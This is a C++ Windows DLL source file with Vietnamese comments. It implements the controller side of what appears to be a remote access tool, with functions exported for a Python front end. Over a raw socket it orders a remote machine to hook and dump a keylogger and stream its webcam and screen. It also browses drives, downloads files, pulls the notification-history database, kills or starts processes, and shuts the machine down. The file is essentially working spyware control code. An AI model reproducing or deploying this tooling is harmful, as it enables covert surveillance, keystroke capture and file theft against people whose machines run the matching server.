#include "ClientLib.h"
#include <ws2tcpip.h>
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h> 
#include <sstream>
#include <iomanip>
#include <vector>

using namespace std;

SOCKET clientSocket = INVALID_SOCKET;
const int SERVER_PORT = 5656;

// --- [TỐI ƯU] Biến toàn cục để chứa dữ liệu trả về cho Python ---
// Giúp tránh việc Python đọc vào vùng nhớ rác
static std::string g_result_buffer; 

wstring Utf8ToWstring(const string& str) {
    if (str.empty()) return wstring();
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

// ==========================================
//      CÁC HÀM HỖ TRỢ NỘI BỘ 
// ==========================================

void sendCommandInternal(string command) {
    if (clientSocket == INVALID_SOCKET) return;
    string dataToSend = command + "\n"; 
    send(clientSocket, dataToSend.c_str(), (int)dataToSend.length(), 0);
}

string receiveLine() {
    string line = "";
    char c;
    while (true) {
        int r = recv(clientSocket, &c, 1, 0);
        if (r <= 0) break;
        if (c == '\n') break;
        if (c != '\r') line += c; 
    }
    return line;
}

void receiveImageResponseInternal(const char* filename) {
    string sizeStr = receiveLine();
    int imageSize = 0;
    try { imageSize = stoi(sizeStr); } catch (...) { return; }
    if (imageSize == 0) return;

    ofstream file(filename, ios::binary);
    char* buffer = new char[4096];
    int remaining = imageSize;
    
    DWORD timeout = 10000;
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    while (remaining > 0) {
        int r = recv(clientSocket, buffer, (remaining < 4096) ? remaining : 4096, 0);
        if (r <= 0) break;
        file.write(buffer, r);
        remaining -= r;
    }
    delete[] buffer;
    file.close();
}

// ==========================================
//      CÁC HÀM XUẤT KHẨU (CHO PYTHON)
// ==========================================

DLLEXPORT void InitWinsock() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
}

DLLEXPORT bool ConnectToServer(const char* ip, int port) {
    // 1. Nếu đang có socket cũ (dù lỗi hay không), đóng nó đi để làm mới
    if (clientSocket != INVALID_SOCKET) {
        closesocket(clientSocket);
        clientSocket = INVALID_SOCKET;
    }

    // 2. Tạo socket mới
    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        cout << "[LOI] Khong the tao socket." << endl;
        return false;
    }

    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port); 
    addr.sin_addr.s_addr = inet_addr(ip);
    
    // 3. Thử kết nối (Có timeout mặc định của Windows khoảng 20s)
    if (connect(clientSocket, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        cout << "[LOI] Ket noi that bai toi " << ip << ":" << port << endl;
        
        // [QUAN TRỌNG] Reset biến socket về trạng thái vô hiệu
        closesocket(clientSocket);
        clientSocket = INVALID_SOCKET; 
        
        return false;
    } else {
        cout << "[OK] Ket noi thanh cong toi " << ip << ":" << port << endl;
        return true;
    }
}

DLLEXPORT void CloseConnection() {
    if (clientSocket != INVALID_SOCKET) closesocket(clientSocket);
    WSACleanup();
}

DLLEXPORT void SendStringCmd(const char* cmd) {
    if (clientSocket != INVALID_SOCKET) {
        sendCommandInternal(string(cmd));
    }
}

// --- [TỐI ƯU] Trả về chuỗi trực tiếp thay vì ghi file apps.txt ---
DLLEXPORT const char* GetAppList() {
    sendCommandInternal("APPLICATION"); Sleep(100);
    sendCommandInternal("XEM");
    
    // Cài đặt timeout nhận dữ liệu
    DWORD timeout = 15000;
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    string countStr = receiveLine();
    int count = 0;
    try { count = stoi(countStr); } catch (...) { 
        g_result_buffer = ""; return g_result_buffer.c_str(); 
    }

    stringstream ss;
    for (int i = 0; i < count; i++) {
        string status = receiveLine(); // "ok" hoặc lỗi
        if (status == "ok") {
            string name = receiveLine();
            string id = receiveLine();
            string threads = receiveLine();
            string memory = receiveLine(); // [MỚI] Đọc thêm dòng Memory

            // Format: id|name|threads|memory
            ss << id << "|" << name << "|" << threads << "|" << memory << "\n";
        }
    }
    sendCommandInternal("QUIT");
    
    // Lưu vào buffer tĩnh và trả về con trỏ
    g_result_buffer = ss.str();
    return g_result_buffer.c_str();
}

// --- [TỐI ƯU] Trả về chuỗi trực tiếp ---
DLLEXPORT const char* GetProcessList() { // Thực ra là list process ẩn/system
    sendCommandInternal("PROCESS"); Sleep(100);
    sendCommandInternal("XEM");

    DWORD timeout = 15000;
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    string countStr = receiveLine();
    int count = 0;
    try { count = stoi(countStr); } catch (...) { 
        g_result_buffer = ""; return g_result_buffer.c_str(); 
    }

    stringstream ss;
    for (int i = 0; i < count; i++) {
        string name = receiveLine();
        string id = receiveLine();
        string threads = receiveLine();
        ss << id << "|" << name << "|" << threads << "\n";
    }
    sendCommandInternal("QUIT");

    g_result_buffer = ss.str();
    return g_result_buffer.c_str();
}

// --- [TỐI ƯU] Trả về chuỗi trực tiếp ---
DLLEXPORT const char* GetInstalledApps() {
    sendCommandInternal("GET_INSTALLED");
    
    string countStr = receiveLine();
    int count = 0;
    try { count = stoi(countStr); } catch (...) { 
        g_result_buffer = ""; return g_result_buffer.c_str(); 
    }

    stringstream ss;
    for (int i = 0; i < count; i++) {
        string name = receiveLine();
        if(!name.empty()) ss << name << "\n";
    }
    
    g_result_buffer = ss.str();
    return g_result_buffer.c_str();
}

// --- [TỐI ƯU] Trả về chuỗi trực tiếp ---
DLLEXPORT const char* GetDrives() {
    sendCommandInternal("EXPLORER"); Sleep(100);
    sendCommandInternal("GET_DRIVES");

    string countStr = receiveLine();
    int count = 0;
    try { count = stoi(countStr); } catch (...) { 
        g_result_buffer = ""; return g_result_buffer.c_str(); 
    }

    stringstream ss;
    for (int i = 0; i < count; i++) {
        string line = receiveLine();
        ss << line << "\n";
    }
    sendCommandInternal("QUIT");

    g_result_buffer = ss.str();
    return g_result_buffer.c_str();
}

// --- [TỐI ƯU] Trả về chuỗi trực tiếp ---
DLLEXPORT const char* ExplorePath(const char* path) {
    sendCommandInternal("EXPLORER"); Sleep(100);
    sendCommandInternal("GET_DIR");
    sendCommandInternal(path); 

    string countStr = receiveLine();
    int count = 0;
    try { count = stoi(countStr); } catch (...) { 
        g_result_buffer = ""; return g_result_buffer.c_str(); 
    }

    stringstream ss;
    for (int i = 0; i < count; i++) {
        string line = receiveLine();
        ss << line << "\n";
    }
    sendCommandInternal("QUIT");

    g_result_buffer = ss.str();
    return g_result_buffer.c_str();
}

// 4. Hàm chụp ảnh -> Ghi ra file (Giữ nguyên vì là binary)
DLLEXPORT void CaptureScreen() {
    sendCommandInternal("TAKEPIC"); Sleep(500);
    sendCommandInternal("TAKE");
    receiveImageResponseInternal("screenshot.bmp");
    sendCommandInternal("QUIT");
}

// 5. Hàm quay Video (Stream)
DLLEXPORT void ReceiveVideoStream(int duration) {
    if (clientSocket == INVALID_SOCKET) return;

    sendCommandInternal("VIDEO"); Sleep(200);
    string start = "START"; 
    if(duration > 0) start += " " + to_string(duration);
    sendCommandInternal(start);

    const int MAX_BUFFER = 500*1024;
    char* buffer = new char[MAX_BUFFER];
    DWORD timeout = 5000; 
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
    
    while(true) {
        string head = receiveLine();
        if(head == "STOPPED" || head == "TIMEOUT" || head == "QUIT" || head.empty()) break;
        int size = 0;
        try { size = stoi(head); } catch(...) { continue; }
        if(size > MAX_BUFFER) continue;

        int received = 0; 
        int remain = size;
        while(remain > 0) {
            int r = recv(clientSocket, buffer + received, remain, 0);
            if(r<=0) break;
            received += r; remain -= r;
        }
        
        ofstream file("live.jpg", ios::binary);
        if(file.is_open()) { 
            file.write(buffer, received); 
            file.close(); 
        }
        // Giảm tải CPU
        Sleep(10); 
    }
    delete[] buffer;
    sendCommandInternal("QUIT");
}

DLLEXPORT void ReceiveWebcamStream() {
    if (clientSocket == INVALID_SOCKET) return;

    sendCommandInternal("WEBCAM"); Sleep(200);
    sendCommandInternal("START");

    const int MAX_BUFFER = 500 * 1024; 
    char* buffer = new char[MAX_BUFFER];

    DWORD timeout = 3000;
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    while (true) {
        string header = receiveLine();
        if (header == "STOPPED" || header == "QUIT" || header.empty()) break;

        int imageSize = 0;
        try { imageSize = stoi(header); } catch (...) { continue; }
        if (imageSize == 0 || imageSize > MAX_BUFFER) continue;

        int totalReceived = 0;
        int remaining = imageSize;
        bool error = false;

        while (remaining > 0) {
            int canRead = (remaining < 4096) ? remaining : 4096;
            int r = recv(clientSocket, buffer + totalReceived, canRead, 0);
            if (r <= 0) { error = true; break; }
            totalReceived += r;
            remaining -= r;
        }

        if (error) break;

        ofstream file("webcam.jpg", ios::binary);
        if (file.is_open()) {
            file.write(buffer, totalReceived);
            file.flush();
            file.close();
        }
        // [QUAN TRỌNG] Sleep nhỏ để Python kịp đọc file
        Sleep(10); 
    }

    delete[] buffer;
    sendCommandInternal("QUIT");
}

DLLEXPORT void ReceiveScreenStream() {
    if (clientSocket == INVALID_SOCKET) return;

    // [QUAN TRỌNG] Sửa lệnh gửi đi thành "VIDEO" để khớp với Server.cs
    // Server dùng hàm video() cho chức năng quay màn hình
    sendCommandInternal("VIDEO"); 
    Sleep(200);
    sendCommandInternal("START");

    // Buffer 4MB cho màn hình độ phân giải cao
    const int MAX_BUFFER = 4 * 1024 * 1024; 
    char* buffer = new char[MAX_BUFFER];

    // Timeout ngắn (1s) để thoát nhanh nếu lỗi
    DWORD timeout = 1000; 
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    while (true) {
        string header = receiveLine();
        
        // 1. Kiểm tra tín hiệu dừng
        if (header == "STOPPED" || header == "TIMEOUT" || header == "QUIT" || header.empty()) break;

        // 2. Kiểm tra Header hợp lệ (chống treo khi nhận dữ liệu rác)
        bool isNumber = true;
        for (char c : header) {
            if (!isdigit(c)) { isNumber = false; break; }
        }
        if (!isNumber) {
            // Nếu nhận được text lạ (vd: phản hồi từ lệnh khác), thoát ngay
            break; 
        }

        int imageSize = 0;
        try { imageSize = stoi(header); } catch (...) { break; }
        
        if (imageSize == 0 || imageSize > MAX_BUFFER) continue;

        int totalReceived = 0;
        int remaining = imageSize;
        bool error = false;

        while (remaining > 0) {
            int canRead = (remaining < 8192) ? remaining : 8192;
            int r = recv(clientSocket, buffer + totalReceived, canRead, 0);
            if (r <= 0) { error = true; break; }
            totalReceived += r;
            remaining -= r;
        }

        if (error) break;

        // 3. KỸ THUẬT GHI FILE TẠM (Atomic Write) -> Giúp Web không bị chớp/đơ
        ofstream file("screen.tmp", ios::binary);
        if (file.is_open()) {
            file.write(buffer, totalReceived);
            file.close();
            
            // Xóa file cũ, đổi tên file mới (thao tác này cực nhanh)
            remove("screen.jpg");
            rename("screen.tmp", "screen.jpg");
        }
        
        // Sleep để giảm tải CPU và đồng bộ FPS (Server đang sleep 50ms)
        Sleep(18);
    }
    
    delete[] buffer;
    
    // Reset timeout về mặc định
    DWORD defaultTimeout = 20000;
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&defaultTimeout, sizeof(defaultTimeout));
    
    sendCommandInternal("QUIT");
}

DLLEXPORT void KillProcess(const char* pid) {
    if (clientSocket == INVALID_SOCKET) return;
    sendCommandInternal("PROCESS"); Sleep(50);
    sendCommandInternal("KILL");    Sleep(50);
    sendCommandInternal("KILLID");  Sleep(50);
    sendCommandInternal(pid);
    receiveLine(); // Đọc phản hồi dọn buffer
    sendCommandInternal("QUIT");
    sendCommandInternal("QUIT");
}

DLLEXPORT void StartProcess(const char* name) {
    if (clientSocket == INVALID_SOCKET) return;
    sendCommandInternal("PROCESS"); Sleep(50);
    sendCommandInternal("START");   Sleep(50);
    sendCommandInternal("STARTID"); Sleep(50);
    sendCommandInternal(name);
    receiveLine(); 
    sendCommandInternal("QUIT");
    sendCommandInternal("QUIT");
}

DLLEXPORT void HookKeylog() {
    if (clientSocket == INVALID_SOCKET) return;
    sendCommandInternal("KEYLOG"); Sleep(100);
    sendCommandInternal("HOOK");   Sleep(100);
    sendCommandInternal("QUIT");
}

DLLEXPORT void UnhookKeylog() {
    if (clientSocket == INVALID_SOCKET) return;
    sendCommandInternal("KEYLOG"); Sleep(100);
    sendCommandInternal("UNHOOK"); Sleep(100);
    sendCommandInternal("QUIT");
}

DLLEXPORT void GetKeylog() {
    // Vẫn ghi file vì keylog có thể rất dài và chứa ký tự lạ
    if (clientSocket == INVALID_SOCKET) return;
    sendCommandInternal("KEYLOG"); Sleep(100);
    sendCommandInternal("PRINT"); 
    
    ofstream file("keylog.txt");
    DWORD timeout = 2000;
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
    
    char buffer[4096];
    while (true) {
        int r = recv(clientSocket, buffer, 4095, 0);
        if (r <= 0) break;
        buffer[r] = '\0';
        file << buffer;
    }
    file.close();
    sendCommandInternal("QUIT");
}

DLLEXPORT void GetNotificationHistory() {
    // Vẫn ghi file vì đây là Binary DB
    if (clientSocket == INVALID_SOCKET) return;
    sendCommandInternal("GET_NOTI");
    
    string sizeStr = receiveLine();
    long long fileSize = 0;
    try { fileSize = stoll(sizeStr); } catch (...) {}
    if (fileSize <= 0) return;

    ofstream file("history.db", ios::binary);
    char* buffer = new char[4096];
    long long remaining = fileSize;
    
    DWORD timeout = 10000;
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    while (remaining > 0) {
        int bytesToRead = (remaining < 4096) ? (int)remaining : 4096;
        int r = recv(clientSocket, buffer, bytesToRead, 0);
        if (r <= 0) break;
        file.write(buffer, r);
        remaining -= r;
    }
    file.flush(); file.close();
    delete[] buffer;
}

// --- HÀM TẢI FILE TỪ SERVER VỀ CLIENT ---
DLLEXPORT void DownloadFile(const char* remotePath, const char* localPath) {
    if (clientSocket == INVALID_SOCKET) return;

    // 1. Gửi lệnh yêu cầu tải
    sendCommandInternal("EXPLORER"); Sleep(100);
    sendCommandInternal("DOWNLOAD");
    sendCommandInternal(remotePath); 

    // 2. Nhận kích thước file từ Server
    string sizeStr = receiveLine();
    long long fileSize = 0;
    try { fileSize = stoll(sizeStr); } catch (...) {}

    if (fileSize <= 0) {
        // File không tồn tại hoặc lỗi bên Server
        sendCommandInternal("QUIT");
        return;
    }

    // 3. Tạo file local (Hỗ trợ tên tiếng Việt UTF-8 -> UTF-16)
    wstring wLocalPath = Utf8ToWstring(string(localPath));
    ofstream file(wLocalPath.c_str(), ios::binary); 

    if (!file.is_open()) {
        // Lỗi không tạo được file (do quyền hạn hoặc đường dẫn sai)
        // Vẫn phải đọc hết dữ liệu rác từ socket để tránh lỗi lệnh sau
        // Nhưng ở đây ta chọn cách ngắt lệnh QUIT luôn cho nhanh
        sendCommandInternal("QUIT");
        return;
    }

    // 4. Nhận dữ liệu
    char* buffer = new char[4096];
    long long remaining = fileSize;
    
    // Tăng timeout lên 30s vì tải file lớn có thể lâu
    DWORD timeout = 30000;
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    while (remaining > 0) {
        int bytesToRead = (remaining < 4096) ? (int)remaining : 4096;
        int r = recv(clientSocket, buffer, bytesToRead, 0);
        
        if (r <= 0) break; // Mất kết nối giữa chừng

        file.write(buffer, r);
        remaining -= r;
    }

    file.flush();
    file.close();
    delete[] buffer;

    // 5. Kết thúc phiên Explorer
    sendCommandInternal("QUIT");
}

DLLEXPORT void ShutdownServer() {
    if (clientSocket != INVALID_SOCKET) sendCommandInternal("SHUTDOWN");
}

DLLEXPORT void RestartServer() {
    if (clientSocket != INVALID_SOCKET) sendCommandInternal("RESTART");
}


DLLEXPORT const char* GetSystemStats() {
    if (clientSocket == INVALID_SOCKET) return "0|0|0|0|0";
    sendCommandInternal("MONITOR");

    // Timeout ngắn
    DWORD timeout = 2000;
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    string data = receiveLine(); // Nhận: CPU|RAM|DISK

    // Reset timeout
    DWORD defaultTimeout = 20000;
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&defaultTimeout, sizeof(defaultTimeout));

    g_result_buffer = data;
    return g_result_buffer.c_str();
}

DLLEXPORT void ClearKeylogRemote() {
    if (clientSocket == INVALID_SOCKET) return;
    
    sendCommandInternal("KEYLOG"); Sleep(50);
    sendCommandInternal("CLEAR");  // Gửi lệnh xóa mới thêm
    
    // Đọc phản hồi "OK" hoặc "ERR" để dọn sạch buffer
    receiveLine(); 
    
    sendCommandInternal("QUIT");
}